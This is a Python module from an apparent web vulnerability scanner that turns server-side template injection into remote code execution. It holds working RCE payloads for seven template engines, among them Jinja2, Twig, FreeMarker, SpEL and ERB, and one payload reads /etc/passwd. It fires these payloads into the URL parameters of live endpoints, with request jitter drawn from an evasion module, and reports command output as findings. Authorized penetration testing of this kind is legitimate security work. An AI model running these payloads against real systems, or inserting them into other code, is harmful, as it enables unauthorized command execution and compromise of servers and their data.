"""
modules/vulns/ssti_rce.py — SSTI → RCE Escalation

When SSTI is detected, escalates to actual Remote Code Execution.
Runs AFTER ssti.py — reads ctx for previously found SSTI findings
and tries engine-specific RCE chains.
"""
import asyncio
import logging
from urllib.parse import urlparse, parse_qs, urlencode
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT
from core.evasion import maybe_jitter

logger = logging.getLogger(__name__)

# Engine-specific RCE payloads
RCE_CHAINS: dict[str, list[str]] = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
    ],
    "Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|map('system')|join}}",
        "{{_self.env.enableDebug()}}{{_self.env.isDebug()}}",
    ],
    "FreeMarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign classloader=product.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>',
    ],
    "Spring SpEL": [
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
    ],
    "ERB": [
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= IO.popen('id').read %>",
    ],
    "Velocity": [
        '#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
    ],
    "Pebble": [
        "{% for i in 0|range(1) %}{{ '' }}{% set result = 'id' | sh %}{{ result }}{% endfor %}",
    ],
}

# Engine detection mapping from SSTI module output
ENGINE_KEYWORDS = {
    "Jinja2":    ["jinja2", "jinja", "python", "flask", "django"],
    "Twig":      ["twig", "php", "symfony", "laravel"],
    "FreeMarker":["freemarker", "java", "spring"],
    "Spring SpEL":["spel", "spring", "java", "thymeleaf"],
    "ERB":       ["erb", "ruby", "rails", "sinatra"],
    "Velocity":  ["velocity", "java"],
    "Pebble":    ["pebble", "java"],
}

RCE_INDICATORS = [
    "uid=", "gid=", "groups=", "root:", "www-data", "apache",
    "nginx", "daemon", "nobody", "NT AUTHORITY",
]

WINDOWS_CMD = "whoami"
LINUX_CMD   = "id"


class SstiRce:
    async def run(self, ctx: dict) -> list[Finding]:
        """Check for SSTI findings in ctx and escalate to RCE."""
        findings: list[Finding] = []
        limiter  = ctx["limiter"]
        verifier = ctx.get("verifier")
        sem      = asyncio.Semaphore(3)

        # Look for SSTI findings already in context
        # The pipeline stores partial findings in a shared list
        ssti_findings = ctx.get("_ssti_findings", [])
        if not ssti_findings:
            # Fall back to scanning endpoints independently
            endpoints = ctx.get("endpoints", [])
            for ep in endpoints[:50]:
                f = await self._independent_escalate(ep, ctx, limiter, sem, verifier)
                if f:
                    findings.append(f)
            logger.info(f"SstiRce completed — {len(findings)} RCE escalation(s)")
            return findings

        for ssti_f in ssti_findings:
            url   = ssti_f.get("affected_url", "")
            title = ssti_f.get("title", "")
            if not url:
                continue
            engine = self._detect_engine(title)
            f = await self._escalate(url, engine, limiter, sem, verifier)
            if f:
                findings.append(f)

        logger.info(f"SstiRce completed — {len(findings)} RCE escalation(s)")
        return findings

    def _detect_engine(self, title: str) -> str:
        title_low = title.lower()
        for engine, keywords in ENGINE_KEYWORDS.items():
            if any(kw in title_low for kw in keywords):
                return engine
        return "Jinja2"  # most common default

    async def _escalate(self, url: str, engine: str, limiter, sem, verifier) -> Finding | None:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return None

        chains = RCE_CHAINS.get(engine, RCE_CHAINS["Jinja2"])

        async with sem:
            for param in list(params.keys())[:2]:
                for rce_payload in chains:
                    p = dict(params)
                    p[param] = [rce_payload]
                    probe_url = parsed._replace(query=urlencode(p, doseq=True)).geturl()
                    try:
                        await maybe_jitter()
                        async with limiter.acquire():
                            async with make_client(timeout=PROBE_TIMEOUT) as c:
                                r = await c.get(probe_url)
                        body = r.text
                        matched = [ind for ind in RCE_INDICATORS if ind in body]
                        if matched:
                            idx = body.find(matched[0])
                            snippet = body[max(0, idx-10):idx+150].strip()
                            finding = Finding(
                                title=f"SSTI → RCE ({engine}) in '{param}' [COMMAND EXECUTED]",
                                severity="Critical",
                                description=(
                                    f"SSTI escalated to Remote Code Execution via {engine} payload. "
                                    f"Server executed OS command and returned: {snippet[:100]}"
                                ),
                                affected_url=probe_url,
                                proof=f"GET {probe_url}\nPayload: {rce_payload}\nOutput: {snippet[:300]}",
                                remediation="This is full RCE. Immediately patch the template injection. Never pass user input to template engines.",
                                impact=5, likelihood=5, module="SstiRce",
                                references=["https://portswigger.net/research/server-side-template-injection"],
                                cvss_score=10.0, cwe="CWE-94",
                            )
                            if verifier and verifier.available:
                                try:
                                    conf, shot = await verifier.verify_ssti(probe_url, matched[0])
                                    if conf:
                                        finding.verified   = True
                                        finding.screenshot = shot
                                except Exception:
                                    pass
                            return finding
                    except Exception as e:
                        logger.debug(f"SSTI RCE probe {probe_url}: {e}")
        return None

    async def _independent_escalate(self, ep: str, ctx: dict, limiter, sem, verifier) -> Finding | None:
        """Try SSTI→RCE on an endpoint without prior SSTI detection."""
        parsed = urlparse(ep)
        if not parsed.query:
            return None
        params = parse_qs(parsed.query)
        for engine, chains in list(RCE_CHAINS.items())[:3]:  # top 3 engines
            f = await self._escalate(ep, engine, limiter, sem, verifier)
            if f:
                return f
        return None
